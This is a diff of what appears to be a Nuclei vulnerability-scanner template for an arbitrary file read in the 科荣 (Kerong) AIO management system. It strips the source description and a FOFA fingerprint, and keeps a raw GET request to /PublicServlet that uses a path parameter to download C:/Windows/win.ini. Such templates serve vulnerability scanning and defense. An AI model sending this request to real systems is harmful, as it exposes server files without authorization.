@@ -3,12 +3,8 @@ info:
   name: 科荣AIO管理系统 PublicServlet 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zcy8wkw5dtbgh6zm'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zcy8wkw5dtbgh6zm
-    fofa: body="changeAccount('8000')"
 http:
 - raw:
   - 'GET /PublicServlet?operation=downLoadFiles&path=C:/WIndows/win.ini&pho= HTTP/1.1
